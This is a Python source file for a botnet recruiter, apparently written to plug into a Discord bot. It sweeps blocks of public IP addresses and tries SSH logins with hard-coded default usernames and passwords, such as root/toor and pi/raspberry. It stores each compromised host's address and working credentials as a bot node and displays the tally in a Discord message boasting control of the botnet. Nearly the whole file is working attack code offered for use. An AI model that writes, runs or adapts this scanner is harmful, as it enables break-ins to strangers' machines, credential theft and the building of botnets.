class BotNet:
    def __init__(self):
        self.nodes = {}
        self.active_nodes = 0
        self.total_power = 0
        self.scanning = False
        
        self.passwords = ['root', 'admin', 'password', '123456', 'toor', 'ubuntu', 'debian', 'centos', 'raspberry', 'pi', 'nvidia', 'jetson', 'odroid']
        self.usernames = ['root', 'admin', 'user', 'ubuntu', 'debian', 'centos', 'pi', 'oracle', 'postgres']
        
        self.ip_ranges = []
        for first in range(1, 30):
            for second in range(0, 30):
                self.ip_ranges.append(f"{first}.{second}")
        
        self.botnet_ports = [22, 23, 21, 2222, 3389, 5900, 8080, 8443, 8888, 9999]
    
    async def scan_network(self):
        if self.scanning:
            return
        self.scanning = True
        print("🌍 Starting GLOBAL BOTNET SCAN...")
        
        while self.scanning:
            for ip_range in self.ip_ranges[:100]:
                for i in range(1, 30):
                    ip = f"{ip_range}.{i}"
                    for port in self.botnet_ports[:5]:
                        for username in self.usernames[:3]:
                            for password in self.passwords[:10]:
                                if await self.try_connect(ip, port, username, password):
                                    self.add_bot(ip, port, username, password)
                                    await asyncio.sleep(0.05)
            await asyncio.sleep(5)
    
    async def try_connect(self, ip, port, username, password):
        try:
            if port == 22:
                try:
                    import asyncssh
                    conn = await asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None, connect_timeout=0.5)
                    conn.close()
                    print(f"✅ BOT FOUND: {ip}:{port}")
                    return True
                except:
                    pass
        except:
            pass
        return False
    
    def add_bot(self, ip, port, username, password):
        bot_id = hashlib.md5(f"{ip}:{port}:{username}:{time.time()}".encode()).hexdigest()[:12]
        self.nodes[bot_id] = {
            'id': bot_id, 'ip': ip, 'port': port, 'username': username, 'password': password,
            'status': 'online', 'last_seen': time.time(), 'attack_power': random.randint(100000, 500000)
        }
        self.active_nodes = len(self.nodes)
        self.total_power = self.active_nodes * 100000
        return bot_id
    
    def stop_scan(self):
        self.scanning = False
    
    def get_bots_count(self):
        return self.active_nodes
    
    def get_stats(self):
        return {
            'total_bots': self.active_nodes,
            'total_power': self.total_power,
            'recent_bots': list(self.nodes.values())[-5:]
        }
    
    def get_stats_embed(self):
        stats = self.get_stats()
        embed = discord.Embed(
            title="🤖 GLOBAL BOTNET NETWORK",
            description=f"```diff\n+ TOTAL BOTS: {stats['total_bots']:,}\n+ ONLINE BOTS: {stats['total_bots']:,}\n+ TOTAL POWER: {stats['total_power']:,} threads\n+ STATUS: ACTIVE\n\n💀 All botnet power under your control 💀```",
            color=0x00FF00
        )
        recent = ""
        for bot in stats['recent_bots']:
            recent += f"• {bot['ip']}:{bot['port']}\n"
        if recent:
            embed.add_field(name="📡 RECENT BOTS", value=recent, inline=True)
        return embed

